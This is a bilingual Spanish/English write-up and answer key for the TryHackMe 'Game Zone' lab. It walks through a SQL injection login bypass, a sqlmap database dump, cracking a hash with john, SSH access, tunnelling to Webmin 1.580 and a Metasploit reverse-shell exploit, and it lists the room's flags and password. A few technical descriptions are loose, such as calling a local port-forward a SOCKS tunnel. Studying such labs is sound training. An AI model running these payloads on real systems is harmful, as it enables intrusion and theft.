# Game Zone

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | ctf | `gamezone` | https://tryhackme.com/room/gamezone | 01 Level Easy | TryHackMe | SQL Injection / SQLMap / John / SSH tunnel / Webmin / Metasploit / port 10000 | Ofensivo: inyección SQL en portal.php para volcar la base de datos, crackear credenciales, acceder por SSH, pivotar con un túnel y explotar Webmin 1.580 para root. |

---

> **Objeto:** Comprometer "Game Zone", el juego online de la sala: descubrir la inyección SQL en `portal.php` (login `/player.php`), usar SQLMap para volcar la base de datos y obtener credenciales de `agent47`, crackear el hash, entrar por SSH y, tras enumerar los puertos internos, pivotar el acceso a un servicio Webmin `1.580` expuesto en el puerto `10000` para explotarlo con Metasploit y leer la flag de root.

**Contexto:** Sala CTF (by BLOO) sobre un juego en línea llamado Game Zone. El sitio `portal.php` es vulnerable a inyección SQL basada en error: una sentencia `' OR 1=1-- -` salta el login y lleva a `player.php`, que muestra el perfil base64 del usuario `agent 47` (pista del nombre de usuario real `agent47`). Con SQLMap se vuelca la tabla de usuarios y se obtiene el hash SHA-256 `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`, que con `rockyou` se descifra a la contraseña `videogamer124`. Por SSH (`agent47:videogamer124`) se recupera la flag de usuario, y enumerando los puertos en escucha aparece el puerto `10000` con `Webmin 1.580`, alcanzable solo internamente mediante un túnel SSH (socks). El exploit de Metasploit para esa versión concede una shell de root.

> **ES:** "Game Zone" — SQLi y SQLMap, crackeo de hash, SSH con túnel y Webmin 1.580 a root.
> **EN:** SQL injection into portal.php, SQLMap dump, hash cracking, SSH pivot and a classic Webmin 1.580 exploit to reach root.

## Solucionario

### Task 1: Conexión / Connection

**Explicación:** Se inicia la máquina del laboratorio y se presenta la pregunta sobre el nombre del usuario que se intenta suplantar: el perfil filtrado en el juego corresponde a `Agent 47` (de Hitman).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Deploy the machine. / Despliega la máquina. | `No answer needed` |
| 1.2 | ¿Cuál es el nombre de usuario del juego? / What is the username of the game? | `Agent 47` |

### Task 2: Inyección SQL / SQL Injection

**Explicación:** La página `portal.php` construye la consulta de login concatenando la entrada (debilidad clásica de error-based SQLi). Enviando `' OR 1=1-- -` en el campo de usuario se autentica sin credenciales y se redirige a `player.php`, que devuelve el perfil como base64. La página vulnerable es `portal.php`.

```bash
# POST a login.php (portal): user=' OR 1=1-- -
# Respuesta -> /player.php con perfil base64 del "agent 47"
echo '<base64>' | base64 -d
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 2.1 | Login without credentials using SQLi. / Entra sin credenciales con SQLi. | `No answer needed` |
| 2.2 | View the user profile page. / Revisa la página del perfil. | `No answer needed` |
| 2.3 | ¿Qué página es vulnerable a la inyección SQL? / What page is vulnerable to SQL injection? | `portal.php` |

### Task 3: Volcado con SQLMap / SQLMap Dump

**Explicación:** El sitio también expone un formulario de búsqueda; interrumpiendo la petición en Burp se captura el `request` y, con SQLMap, se vuelca la base de datos MySQL:

```bash
sqlmap -r gamezone.req --dbms=mysql --dump
```

El resultado revela la tabla de usuarios: el usuario `agent47` con el hash SHA-256 `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`. El método de petición que usa el formulario explotado es `post`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 3.1 | ¿Qué hash se obtiene de la base de datos? / What is the hash obtained from the database? | `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14` |
| 3.2 | ¿Cuál es el usuario descubierto en la base de datos? / What is the username discovered in the database? | `agent47` |
| 3.3 | ¿Qué método HTTP usa el formulario explotado por SQLMap? / What HTTP method does the exploited form use? | `post` |

### Task 4: Descifrado del hash y SSH / Cracking and SSH

**Explicación:** El hash SHA-256 se descifra offline con `john` y el diccionario `rockyou.txt`, obteniendo la contraseña `videogamer124`. Con ella se inicia sesión por SSH como `agent47` y, explorando el home, se lee la flag de usuario.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh agent47@<IP>            # pass: videogamer124
cat /home/agent47/user.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 4.1 | Crack the hash with John. / Descifra el hash con John. | `No answer needed` |
| 4.2 | ¿Qué contraseña se obtiene al descifrar el hash? / What password do you get from cracking? | `videogamer124` |
| 4.3 | ¿Cuál es la flag de usuario? / What is the user flag? | `649ac17b1480ac13ef1e4fa579dac95c` |

### Task 5: Pivotación con túnel SSH / Pivoting via SSH Tunnel

**Explicación:** Desde la sesión SSH se enumeran los servicios en escucha. Además de los conocidos, hay `5` puertos activos y entre ellos uno nuevo en `10000` que no es alcanzable desde fuera. Identificando el servicio se obtiene `Webmin`, en versión `1.580`. Para alcanzarlo desde la máquina del atacante se crea un túnel SOCKS: `ssh -L 10000:localhost:10000 agent47@<IP>`, y se confirma con un escaneo local.

```bash
ss -tlnp
#       estado   poresc.  pid/proc
# LISTEN ...  10000 ...
ssh -L 10000:localhost:10000 agent47@<IP>   # túnel a Webmin
nmap -sT -p10000 localhost
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 5.1 | ¿Cuántos puertos quedan en escucha tras la enumeración? / How many ports are listening? | `5` |
| 5.2 | ¿Qué software se ejecuta en el puerto descubierto? / What software runs on the discovered port? | `Webmin` |
| 5.3 | ¿Qué versión tiene ese software? / What version is it? | `1.580` |

### Task 6: Explotación de Webmin / Webmin Exploitation

**Explicación:** Webmin `1.580` tiene vulnerabilidades de ejecución de comandos conocidas. Desde Metasploit se selecciona el exploit adecuado para esa versión (p. ej. el módulo de Webmin del vector `/proc/*/FILE`), se configura `RHOSTS` como `127.0.0.1:10000` a través del túnel y se obtiene una sesión con privilegios de root, donde se lee la flag de root.

```bash
msfconsole
use exploit/linux/http/webmin_show_cgi_exec
set RHOSTS 127.0.0.1
set RPORT 10000
set SSL true
set PASSWORD <pass>
set PAYLOAD cmd/unix/reverse
run
cat /root/root.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 6 | ¿Cuál es la flag de root? / What is the root flag? | `a4b945830144bdd71908d12d902adeee` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Deploy the machine. | `No answer needed` |
| 1.2 | What is the username of the game? | `Agent 47` |
| 2.1 | Login without credentials using SQLi. | `No answer needed` |
| 2.2 | View the user profile page. | `No answer needed` |
| 2.3 | What page is vulnerable to SQL injection? | `portal.php` |
| 3.1 | What is the hash obtained from the database? | `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14` |
| 3.2 | What is the username discovered in the database? | `agent47` |
| 3.3 | What HTTP method does the exploited form use? | `post` |
| 4.1 | Crack the hash with John. | `No answer needed` |
| 4.2 | What password do you get from cracking? | `videogamer124` |
| 4.3 | What is the user flag? | `649ac17b1480ac13ef1e4fa579dac95c` |
| 5.1 | How many ports are listening? | `5` |
| 5.2 | What software runs on the discovered port? | `Webmin` |
| 5.3 | What version is it? | `1.580` |
| 6 | What is the root flag? | `a4b945830144bdd71908d12d902adeee` |

---

**Metodología:** Reconocimiento del portal y detección de la SQLi en `portal.php` (login con `' OR 1=1-- -`). Volcado de la BD con SQLMap (usuario `agent47` y hash SHA-256), crackeo con `john`/`rockyou` y acceso SSH con `videogamer124`. Enumeración interna (`ss -tlnp`) para descubrir Webmin en `10000`, túnel SSH de pivote y explotación del servicio con Metasploit para obtener la shell de root.

### Cadena de ataque / Attack Chain

```text
portal.php SQLi -> bypass login -> player.php (base64 agent 47) -> SQLMap dump -> SHA-256 craft -> john -> videogamer124 -> SSH -> user flag -> ss -tlnp (10000) -> SSH tunnel -> Webmin 1.580 -> Metasploit RCE -> root flag
```

**Learning chain:** error-based SQLi -> SQLMap dump -> password cracking -> SSH -> port pivoting (SSH tunnel) -> legacy Webmin exploit -> root.

**Lección:** *Las filtraciones de credenciales y los servicios no parcheados escondidos tras un firewall se conectan con SQLi y un túnel SSH: pivotar el tráfico local convierte un servicio interno vulnerable (Webmin 1.580) en la vía directa a root.*

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1213.002 — Data from Information Repositories; T1021.001 — Remote Services: SSH; T1572 — Protocol Tunneling; T1068 — Exploitation for Privilege Escalation

**Fuente:** [TryHackMe - Game Zone](https://tryhackme.com/room/gamezone)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.